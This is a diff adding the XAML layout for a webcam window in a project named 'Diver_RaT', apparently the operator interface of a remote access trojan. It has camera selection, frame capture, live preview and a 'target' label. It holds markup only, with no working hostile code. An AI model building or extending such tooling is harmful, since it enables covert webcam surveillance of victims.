@@ -1,0 +1,74 @@
+<Window x:Class="Diver_RaT.WebcamWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        mc:Ignorable="d"
+        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
+        xmlns:ui="clr-namespace:Diver_RaT"
+        WindowStyle="None"
+        ResizeMode="CanResize"
+        Title="Webcam" Height="660" Width="920"
+        WindowStartupLocation="CenterOwner"
+        Background="{StaticResource WindowBgBrush}"
+        Foreground="#E6E8EF"
+        Closing="Window_Closing">
+
+    <WindowChrome.WindowChrome>
+        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
+                      CornerRadius="8" UseAeroCaptionButtons="False"/>
+    </WindowChrome.WindowChrome>
+
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+        </Grid.RowDefinitions>
+        <ui:CustomTitleBar Grid.Row="0" Title="Webcam"/>
+        <Grid Grid.Row="1" Margin="16">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="Auto"/>
+        </Grid.RowDefinitions>
+
+        <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
+            <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
+            <TextBlock Text="WEBCAM" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
+            <TextBlock x:Name="TargetText" FontSize="13" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
+        </StackPanel>
+
+        <Border Grid.Row="1" Background="{StaticResource PanelGlassBrush}" CornerRadius="8"
+                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1" Padding="8"
+                Margin="0,0,0,8">
+            <StackPanel Orientation="Horizontal">
+                <TextBlock Text="Camera" Foreground="{StaticResource MutedBrush}" VerticalAlignment="Center" Margin="4,0,8,0" FontWeight="SemiBold"/>
+                <ComboBox x:Name="CamCombo" Width="320" SelectionChanged="CamCombo_SelectionChanged"
+                          IsEnabled="False"/>
+                <Button x:Name="CaptureButton" Content="&#x1f4f7;  Capture Frame" Click="CaptureButton_Click"
+                        Padding="14,0" Margin="10,0,0,0"/>
+                <CheckBox x:Name="LiveCheck" Content="Live Preview" Foreground="{StaticResource MutedBrush}"
+                          VerticalAlignment="Center" Margin="14,0,0,0" Checked="LiveCheck_Changed" Unchecked="LiveCheck_Changed"/>
+                <Button x:Name="SaveButton" Content="Save As..." Click="SaveButton_Click"
+                        Padding="14,0" Margin="10,0,0,0" IsEnabled="False"/>
+            </StackPanel>
+        </Border>
+
+        <Border Grid.Row="2" Background="#E60C0F0B" CornerRadius="8"
+                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1">
+            <Grid>
+                <Image x:Name="CamImage" Stretch="Uniform" Margin="8"/>
+                <TextBlock x:Name="Placeholder" Text="&#x1f4f7;" FontSize="48"
+                           HorizontalAlignment="Center" VerticalAlignment="Center"
+                           Foreground="{StaticResource MutedBrush}"/>
+            </Grid>
+        </Border>
+
+        <TextBlock x:Name="StatusText" Grid.Row="3" Margin="2,8,0,0" FontSize="12"
+                   Foreground="{StaticResource MutedBrush}"/>
+        </Grid>
+        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
+                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
+    </Grid>
+</Window>
